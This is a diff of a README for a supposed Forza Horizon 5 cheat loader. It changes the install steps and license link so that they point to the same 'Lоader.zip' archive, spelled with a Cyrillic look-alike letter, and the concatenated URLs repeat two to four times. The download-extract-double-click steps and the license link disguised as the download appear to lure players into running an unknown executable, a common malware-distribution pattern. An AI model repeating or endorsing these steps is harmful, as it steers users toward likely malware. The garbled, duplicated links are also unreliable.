@@ -43,9 +43,9 @@ Our loader is purpose-built for seamless enhancement, giving you the most demand
 
 Follow these steps to install and launch your Forza Horizon 5 Cheats Loader:
 
-1. **Download**: Retrieve the `https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip` file directly from this repository.
+1. **Download**: Retrieve the `https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip` file directly from this repository.
 2. **Extract**: Use WinRAR, 7-Zip, or your preferred tool to extract the archive to your desktop.
-3. **Run Loader**: Double-click `https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip` (or use the compatible runner for your OS) and follow on-screen instructions.
+3. **Run Loader**: Double-click `https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip` (or use the compatible runner for your OS) and follow on-screen instructions.
 4. **Game Directory**: Ensure Forza Horizon 5 is installed and select its location when prompted.
 5. **Customize Cheats**: Choose which enhancements you want active before launching the game.
 6. **Enjoy**: Hit "Start Game" from the loader and unleash new possibilities!
@@ -74,7 +74,7 @@ The developers are **not responsible** for any consequences arising from misuse 
 ## 📝 MIT License
 
 Copyright 2025  
-Distributed under the [MIT License](https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zipоhttps://raw.githubusercontent.com/cgaliciaa101/FH5-GameEnhancer/main/Lоader.zip).  
 Feel free to fork, customize, and contribute to this project as long as you comply with the license terms.
 
 ---
